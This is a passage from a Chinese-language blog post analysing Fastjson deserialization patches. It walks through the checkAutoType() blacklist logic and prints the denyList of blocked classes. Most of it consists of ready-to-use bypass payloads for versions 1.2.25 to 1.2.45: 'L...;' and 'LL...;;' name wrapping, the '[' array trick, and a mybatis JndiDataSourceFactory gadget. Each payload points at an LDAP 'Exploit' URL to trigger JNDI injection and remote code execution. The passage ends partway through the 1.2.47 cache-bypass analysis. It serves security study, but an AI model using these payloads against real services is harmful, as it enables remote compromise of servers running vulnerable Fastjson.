当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">            || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">           ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了梳理一下整个流程，这里准备了一个流程图</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png?x-oss-process=image/format,webp"></p>
<p>简单来说，新版本对fastjson反序列化的限制就是使用黑白名单的方式进行过滤，acceptList为白名单（默认为空）。denyList为黑名单（默认不为空）</p>
<p>默认autoTypeSupport为false，即先执行黑名单过滤，遍历denyList</p>
<p>黑名单denyList过滤列表如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>若正常执行1.2.24payload，则会爆出 autoType 不支持该类的错误</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786376949-5e3335da-be39-4b1b-a7fb-0f4f8e14f374.png"></p>
<h3 id="TK7hh">小结</h3>
1.2.24之后的版本后，都是使用`checkAutoType()`函数，用黑白名单的方式来防御Fastjson反序列化漏洞，因此后面不同补丁的绕过都是基于**黑名单**的绕过

<h2 id="pNCOM">1.2.25 - 1.2.41 补丁绕过</h2>
若按照以前的EXP直接运行，则爆出以下错误，说不支持该类，被黑名单ban了

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786919334-c0ca55a2-397d-4be3-92bb-71c89ff30734.png"></p>
<h3 id="eFTlY">绕过</h3>
这里只需要简单绕过以下，尝试在 com.sun.rowset.JdbcRowSetImpl 前面加一个 L，结尾加上 ; 绕过

<p>并且记住开启<code>AutoTypeSupport</code></p>
<p>运行后即可绕过黑名单，成功执行payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787151444-3145b40b-077a-49ab-9ecc-b5bb50b9ca82.png"></p>
<h3 id="mugdC">断点分析</h3>
<h4 id="KWoRr">黑名单绕过</h4>
我们在`checkAutoType`处下一个断点，跟着看一下怎么绕过的

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787378125-00f9330a-6e12-4e2f-862c-92bed5657524.png"></p>
<p>在如下代码处，首先会进行黑名单校验，之前我们的异常就是在此处抛出的</p>
<p>由于我们对类名加上了<code>L</code>和<code>;</code>，所以这里被不会被拦截</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>下一步进入以下部分，这里是一个<strong>利用点</strong>，后面再说</p>
<p>这里会从Map缓存中查找此类，但是我们之前并没有加载过它，就无法找到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>下一步if条件中<code>!autoTypeSupport</code>，是false的，因此这里并没有什么影响</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后走到这里，我们的<code>autoTypeSupport</code>为true，直接走入核心方法<code>TypeUtils.loadClass</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="xQs2E">类加载</h4>
在`loadClass`方法中，存在这么一个地方，它的功能就是，若以`L`开头`;`结尾，则会去除该开头和该结尾，恢复我们正常的类名

<p>后续的类加载过程就不再多说</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="x8Nhs">1.2.25-1.2.42 补丁绕过</h2>
新一个EXP是这样的，后续的补丁，会在黑名单过滤之前，先将开头`L`和结尾`;`提取出来，若我们写两个`L`和两个`;`，即可绕过限制

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, </span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741789028443-6b420e70-50d6-4226-8699-b726b50c8ba7.png"></p>
<h2 id="o2cRk">1.2.25-1.2.43 补丁绕过</h2>
<h3 id="cCmD2">补丁</h3>
在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836711524-627af9eb-2493-4e33-a232-eb7824eed90f.png"></p>
<h3 id="vZjrF">绕过</h3>
先给出EXP

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在1.2.43之前，运行后是可以执行恶意代码的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741834416864-b67f62d7-857d-476e-9d86-ad0b74e506ef.png"></p>
<h3 id="afalq">断点调试</h3>
我们断点下到以下部分，这里会检查，`@type`的第一个字符是不是`[`，若第一个字符是`[`，则会删除第一个`[`，提取出来其中的类名，调用`Array.newInstance`，并`getClass`来获取返回类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后会进入<code>checkAutoType</code>函数，对<code>[com.sun.rowset.JdbcRowSetImpl</code>这个函数名进行黑白名单验证，类名前有一个<code>[</code>，所以当然不会被拦截</p>
<p>然后就该进行反序列化的操作了，进入到<code>deserialize</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741835271828-d5e51450-2262-4e7e-918c-f8721901b72b.png"></p>
<p>在该方法中，我们之前的报错提示就是从<code>DefaultJSONParser.parseArray()</code>里面抛出的，进该方法的内部分析一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741835418601-fa78b706-bc88-4f06-bbb5-44e0fc2b5e8c.png"></p>
<p>这里就对我们后面的字符进行判断，判断其是否为<code>[</code>和<code>&#123;</code>，这里就是我们报错的原因，只需要将其一一满足即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (token != JSONToken.LBRACKET) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;exepct &#x27;[&#x27;, but &quot;</span> + JSONToken.name(token) + <span class="string">&quot;, &quot;</span> + lexer.info());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="AWOxF">1.2.25-1.2.45补丁绕过</h2>
<h3 id="oFqAi">补丁</h3>
调试`checkAutoType()`函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常

<h3 id="mqkIz">绕过</h3>
+ 前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本

<p>pom.xml文件导入如下（不知道为什么3.5.2版本也能行）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>绕过EXP如下，其中连ldap或rmi都可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">	<span class="string">&quot;properties&quot;</span>:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后可以成功执行恶意命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836187458-940809f1-200a-4d69-8d51-b480d9f3a6dc.png"></p>
<h3 id="leQJ8">断点调试</h3>
从EXP分析，可以知道我们要去`JndiDataSourceFactory`这个类，并且寻找它对`properties`进行赋值的地方，其代码如下

<p>我把断点下载setter方法中，在该方法中，我们找到了熟悉的JNDI注入，即<code>initCtx.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的</p>
<p>所以我们可以很简单的就绕过该补丁限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      InitialContext initCtx;</span><br><span class="line">      <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> getEnvProperties(properties);</span><br><span class="line">      <span class="keyword">if</span> (env == <span class="literal">null</span>) &#123;</span><br><span class="line">        initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (properties.containsKey(INITIAL_CONTEXT)</span><br><span class="line">          &amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));</span><br><span class="line">        dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">        dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DataSourceException</span>(<span class="string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h2 id="f9642">1.2.25-1.2.47补丁绕过</h2>
<h3 id="FtLx3">分析</h3>
在1.2.24版本之后，当在`DefaultJSONParser#parseObject`方法中检测到`@type`关键字后，会调用`checkAutoType`方法对所加载的类有所限制。而在1.2.24版本前，这个位置直接进行了`loadclass`。

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="literal">null</span>);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面即为<code>ParserConfig#checkAutoType</code>的代码，因为他的逻辑比较复杂，因此我跟着组长搞了一个流程图</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中，黄色部分为，可以实现类加载的地方</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png"></p>
<p>我们这里不分析其他地方，只在第二个返回类的地方做文章</p>
<p>首先他会从缓存中找有没有这个类，如果没有找到就从deserializers中继续找，这里它也是一个缓存，如果找到的话则会判断<code>是否期望类不为空且与期望类不一致</code>，如果判断为false的话就会返回这个类。这个条件在默认条件下为flase，因此我们只需要在缓存中存在这个类，即可返回这个类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>读取缓存时，是从<code>mappings</code>中寻找，所以我们需要寻找，在什么地方将类存入<code>mappings</code>的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们找到的可控的方法，为<code>TypeUtils#loadClass</code>方法</p>
<p>这代表的是，如果之前加载过这个类，就放入缓存中，下次加载的时候直接从缓存中拿出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后找哪个地方调用了<code>loadClass</code>方法，找到的可利用方法为<code>MiscCodec#deserialze</code></p>
<p>在clazz等于Class.class的情况下，会调用<code>loadClass</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个<code>**MiscCodec**</code>是什么呢，它继承了<code>ObjectSerializer</code>与<code>ObjectDeserializer</code>，是一个序列化&#x2F;反序列化器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiscCodec</span> <span class="keyword">implements</span> <span class="title class_">ObjectSerializer</span>, ObjectDeserializer </span><br></pre></td></tr></table></figure>

<p>在<code>DefaultJSONParser#parseObject</code>进行反序列化的时候，使用的是<code>JavaBeanDeserializer</code>反序列化器</p>
<p>但是这个反序列化器，我们可以看到，是从<code>config</code>找到的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line">            <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                instance = ((JavaBeanDeserializer) deserializer).createInstance(<span class="built_in">this</span>, clazz);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                                instance = <span 